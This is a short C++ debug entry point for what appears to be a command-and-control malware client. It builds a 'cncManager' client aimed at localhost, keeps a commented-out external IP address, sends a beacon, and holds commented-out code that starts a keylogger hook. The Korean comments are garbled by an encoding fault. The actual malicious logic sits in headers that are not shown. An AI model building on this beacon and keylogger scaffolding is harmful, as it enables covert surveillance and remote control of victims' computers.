#include "cncManager.h"
#include "commandManager.h"
#include "keyLogger.h"

#include <stdlib.h>
#include <iostream>
#include <string>
#include <thread>

/* For DEBUG */
int main() {
    //cncManager client(L"1.251.227.66");
    cncManager client(L"127.0.0.1");

    // Ű�α� �׽�Ʈ�� (���߿� commandManager�� �ű� ����)
//keyLogger logger;
//std::thread keyLog = std::thread(&keyLogger::startHook, logger);
//keyLog.join();
    client.print_setting = true;
    //std::thread fileHandler = std::thread(&cncManager::sendBeacon, client);
    //fileHandler.detach();
    client.sendBeacon();


    while (TRUE) {
        //std::cout << "thread test" << std::endl;
        Sleep(1000);
    }

}